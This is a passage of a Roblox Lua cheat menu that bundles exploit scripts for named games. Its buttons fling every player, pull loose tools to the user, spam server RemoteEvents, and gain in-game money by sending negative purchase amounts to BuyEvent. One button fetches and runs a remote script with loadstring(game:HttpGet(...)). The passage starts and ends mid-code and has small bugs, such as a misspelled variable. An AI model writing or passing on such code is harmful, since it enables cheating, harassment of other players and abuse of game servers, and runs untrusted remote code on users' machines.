WarningLabel.TextStrokeTransparency = 0
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextSize = 20
WarningLabel.Text = ""
WarningLabel.Visible = false

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(1, 0, 0, 25)
ToggleButton.Position = UDim2.new(0, 0, 1, -25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 14
ToggleButton.Text = "Detection: ON"

-- Function to check aim
local function isAimingAtHead(attacker)
    if not attacker.Character or not attacker.Character:FindFirstChild("Head") then return false end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then return false end

    local attackerHead = attacker.Character.Head
    local localHead = LocalPlayer.Character.Head

    local lookDir = attackerHead.CFrame.LookVector
    local dirToOurHead = (localHead.Position - attackerHead.Position).Unit

    local dot = lookDir:Dot(dirToOurHead)
    local angle = math.deg(math.acos(dot))

    return angle <= FOV_THRESHOLD
end

-- Update loop
task.spawn(function()
    while true do
        task.wait(UPDATE_INTERVAL)

        if not detectionEnabled then
            PlayerList.Text = "Detection OFF"
            WarningLabel.Visible = false
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            continue
        end

        local threats = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if isAimingAtHead(plr) then
                    table.insert(threats, plr.Name)
                end
            end
        end

        if #threats > 0 then
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "⚠ Threats:\n" .. table.concat(threats, "\n")
            WarningLabel.Text = "⚠ WARNING: " .. table.concat(threats, ", ") .. " aiming at you!"
            WarningLabel.Visible = true
        else
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "No threats detected."
            WarningLabel.Visible = false
        end
    end
end)

-- Toggle function
local function toggleDetection()
    detectionEnabled = not detectionEnabled
    ToggleButton.Text = detectionEnabled and "Detection: ON" or "Detection: OFF"
end

-- Button Click
ToggleButton.MouseButton1Click:Connect(toggleDetection)

-- Hotkey (G)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.G then
        toggleDetection()
    end
end)
end)

addMainMenuButton("TPUNANCHORED TO PLAYER (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "UnanchoredToolTP"
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 230)
Frame.Position = UDim2.new(0, 20, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "PUBLIC ENEMY UNANCHORED TP"
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Username Input
local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.PlaceholderText = "Enter Player Username"
UsernameBox.Size = UDim2.new(1, -20, 0, 30)
UsernameBox.Position = UDim2.new(0, 10, 0, 40)
UsernameBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
UsernameBox.TextColor3 = Color3.new(0,0,0)
UsernameBox.Font = Enum.Font.Gotham
UsernameBox.TextSize = 14
UsernameBox.Text = ""
Instance.new("UICorner", UsernameBox)

-- Filter Label
local FilterLabel = Instance.new("TextLabel", Frame)
FilterLabel.Size = UDim2.new(1, -20, 0, 20)
FilterLabel.Position = UDim2.new(0, 10, 0, 80)
FilterLabel.Text = "Tool Filter:"
FilterLabel.TextColor3 = Color3.new(0,0,0)
FilterLabel.Font = Enum.Font.Gotham
FilterLabel.TextSize = 13
FilterLabel.BackgroundTransparency = 1

-- Filter Dropdown
local FilterDropdown = Instance.new("TextButton", Frame)
FilterDropdown.Size = UDim2.new(1, -20, 0, 30)
FilterDropdown.Position = UDim2.new(0, 10, 0, 100)
FilterDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
FilterDropdown.Text = "All Tools"
FilterDropdown.TextColor3 = Color3.new(0,0,0)
FilterDropdown.Font = Enum.Font.Gotham
FilterDropdown.TextSize = 13
Instance.new("UICorner", FilterDropdown)

-- Cycle filter options
local filterModes = {"All Tools", "Guns Only", "Melee Only"}
local filterIndex = 1

FilterDropdown.MouseButton1Click:Connect(function()
	filterIndex = filterIndex + 1
	if filterIndex > #filterModes then
		filterIndex = 1
	end
	FilterDropdown.Text = filterModes[filterIndex]
end)

-- Filter logic
local function isToolAllowed(tool)
	local name = tool.Name:lower()

	if filterModes[filterIndex] == "All Tools" then
		return true
	elseif filterModes[filterIndex] == "Guns Only" then
		return name:find("gun") or name:find("pistol") or name:find("UZI") or name:find("silenced pistol") or name:find("desert deagle") or name:find("glock-17") or name:find("glock-19")
	elseif filterModes[filterIndex] == "Melee Only" then
		return name:find("knife") or name:find("bat") or name:find("knife") or name:find("blade") or name:find("crowbar")
	end

	return false
end

-- Main TP (tools fly to player)
local function teleportToolsToPlayer(targetPlayer)
	if not targetPlayer then
		warn("No player specified or player not found.")
		return
	end

	local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then
		warn("Target player has no HRP")
		return
	end

	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") or (v:IsA("BasePart") and v.Name == "Handle") then
			local tool = v:IsA("Tool") and v or v:FindFirstAncestorWhichIsA("Tool")
			if tool and tool:IsDescendantOf(Workspace) and not tool:FindFirstChildOfClass("Humanoid") then
				local handle = tool:FindFirstChild("Handle")
				if handle and not handle.Anchored and isToolAllowed(tool) then
					if handle:FindFirstChild("BodyVelocity") then handle.BodyVelocity:Destroy() end
					local bv = Instance.new("BodyVelocity")
					bv.Velocity = (root.Position - handle.Position).Unit * 100
					bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
					bv.P = 10000
					bv.Parent = handle
					Debris:AddItem(bv, 0.5)
				end
			end
		end
	end
end

-- Grab Tools to Backpack
local function grabToolsToBackpack()
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and not v.Handle.Anchored and isToolAllowed(v) then
			v.Parent = LocalPlayer.Backpack
		end
	end
end

-- TP Button
local TPButton = Instance.new("TextButton", Frame)
TPButton.Size = UDim2.new(1, -20, 0, 30)
TPButton.Position = UDim2.new(0, 10, 1, -75)
TPButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
TPButton.Text = "Teleport Unanchored To Player"
TPButton.TextColor3 = Color3.new(0,0,0)
TPButton.Font = Enum.Font.GothamBold
TPButton.TextSize = 13
Instance.new("UICorner", TPButton)

-- Grab Button
local GrabButton = Instance.new("TextButton", Frame)
GrabButton.Size = UDim2.new(1, -20, 0, 30)
GrabButton.Position = UDim2.new(0, 10, 1, -40)
GrabButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
GrabButton.Text = "Grab Tools"
GrabButton.TextColor3 = Color3.new(0,0,0)
GrabButton.Font = Enum.Font.GothamBold
GrabButton.TextSize = 13
Instance.new("UICorner", GrabButton)

-- Button Events
TPButton.MouseButton1Click:Connect(function()
	local inputName = UsernameBox.Text
	if inputName == "" then
		warn("No username entered.")
		return
	end

	local targetPlayer = Players:FindFirstChild(inputName)
	if not targetPlayer then
		warn("Player not found: " .. inputName)
		return
	end

	teleportToolsToPlayer(targetPlayer)
end)

GrabButton.MouseButton1Click:Connect(grabToolsToBackpack)
end)

addMainMenuButton("FLING ALL (MONSY)", function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
end)

addMainMenuButton("HITBOX EXTENDER (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("", function()
    -- LocalScript (put in StarterPlayerScripts)
-- SPAM SOUND GUI with toggle (draggable, black, rounded corners)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- UPDATED REMOTE (Your new system)
local dropRemote = ReplicatedStorage:WaitForChild("DropRequest", 9e9)

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SpamSoundGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Parent = screenGui
main.Size = UDim2.new(0, 220, 0, 100)
main.Position = UDim2.new(0.5, -110, 0.5, -50)
main.BackgroundColor3 = Color3.fromRGB(255,255,255)
main.Active = true
main.AnchorPoint = Vector2.new(0.5, 0.5)

local uicorner = Instance.new("UICorner", main)
uicorner.CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.Parent = main
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "SPAM DROP"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)

local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = "Toggle"
toggleBtn.Parent = main
toggleBtn.Size = UDim2.new(0, 120, 0, 34)
toggleBtn.Position = UDim2.new(0.5, -60, 0, 46)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleBtn.BorderSizePixel = 0
toggleBtn.AutoButtonColor = true
toggleBtn.Font = Enum.Font.Gotham
toggleBtn.TextSize = 14
toggleBtn.TextColor3 = Color3.fromRGB(0,0,0)
toggleBtn.Text = "OFF"

local toggleCorner = Instance.new("UICorner", toggleBtn)
toggleCorner.CornerRadius = UDim.new(0, 10)

local statusDot = Instance.new("Frame")
statusDot.Name = "StatusDot"
statusDot.Parent = toggleBtn
statusDot.Size = UDim2.new(0, 12, 0, 12)
statusDot.Position = UDim2.new(0, 8, 0.5, -6)
statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
statusDot.BorderSizePixel = 0
local dotCorner = Instance.new("UICorner", statusDot)
dotCorner.CornerRadius = UDim.new(1, 0)

-- Draggable
do
	local dragging, dragStart, startPos
	main.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	main.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local delta = input.Position - dragStart
			main.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
end

-- Spam logic
local isOn = false
local spamTask = nil

local function startSpam()
	if spamTask then return end
	spamTask = task.spawn(function()
		local args = {}
		while isOn do
			pcall(function()
				dropRemote:FireServer(unpack(args))
			end)
			task.wait(0.001)
		end
		spamTask = nil
	end)
end

local function stopSpam()
	isOn = false
end

toggleBtn.MouseButton1Click:Connect(function()
	if not isOn then
		isOn = true
		toggleBtn.Text = "ON"
		statusDot.BackgroundColor3 = Color3.fromRGB(0,255,0)
		startSpam()
	else
		stopSpam()
		toggleBtn.Text = "OFF"
		statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("", function()
   -- LocalScript (put inside StarterPlayerScripts)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- UPDATED REMOTE
local comboRemote = ReplicatedStorage:WaitForChild("GiveCombo3", 9e9)

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "AutoBuyGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 230, 0, 110)
frame.Position = UDim2.new(0.5, -115, 0.5, -55)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "AUTO BUY"
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(0,0,0)
title.TextSize = 16

local toggle = Instance.new("TextButton")
toggle.Parent = frame
toggle.Size = UDim2.new(0, 120, 0, 36)
toggle.Position = UDim2.new(0.5, -60, 0, 50)
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.BorderSizePixel = 0
toggle.Text = "OFF"
toggle.Font = Enum.Font.Gotham
toggle.TextSize = 14
toggle.TextColor3 = Color3.fromRGB(0,0,0)

local toggleCorner = Instance.new("UICorner", toggle)
toggleCorner.CornerRadius = UDim.new(0, 10)

local statusDot = Instance.new("Frame")
statusDot.Parent = toggle
statusDot.Size = UDim2.new(0, 12, 0, 12)
statusDot.Position = UDim2.new(0, 8, 0.5, -6)
statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
statusDot.BorderSizePixel = 0
local statusCorner = Instance.new("UICorner", statusDot)
statusCorner.CornerRadius = UDim.new(1, 0)

-- Logic
local isOn = false
local thread = nil

local function startAuto()
	if thread then return end
	thread = task.spawn(function()
		local args = {}
		while isOn do
			pcall(function()
				comboRemote:FireServer(unpack(args))
			end)
			task.wait(0.001)
		end
		thread = nil
	end)
end

local function stopAuto()
	isOn = false
end

toggle.MouseButton1Click:Connect(function()
	if not isOn then
		isOn = true
		toggle.Text = "ON"
		statusDot.BackgroundColor3 = Color3.fromRGB(0,255,0)
		startAuto()
	else
		stopAuto()
		toggle.Text = "OFF"
		statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
	end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["CASH MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

addMainMenuButton("KALYE ONSE (MONSY)", function()
  --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Item Name TextBox
local itemBox = Instance.new("TextBox")
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 50)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
itemBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
itemBox.TextColor3 = Color3.fromRGB(0,0,0)
itemBox.Font = Enum.Font.Gotham
itemBox.TextSize = 14
itemBox.Parent = frame
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 95)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 145)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic (uses AntiExploit)
sendButton.MouseButton1Click:Connect(function()
    local item = itemBox.Text
    local amount = tonumber(amountBox.Text)

    if item ~= "" and amount then
        ReplicatedStorage.AntiExploit:FireServer(item, amount)
    else
        warn("Invalid item or amount!")
    end
end)
end)

addMainMenuButton("TONDO ROLEPLAY (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").BuyEvent:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("THE BILLIONARE CITY (MONSY)", function()
    -- LocalScript: MONEY GUI – Pure White + Black Text Only
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (White na)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.new(1, 1, 1)  -- Pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(0, 0, 0)  -- Black text
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Money Amount
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 0, 0)  -- Black na rin (walang green)
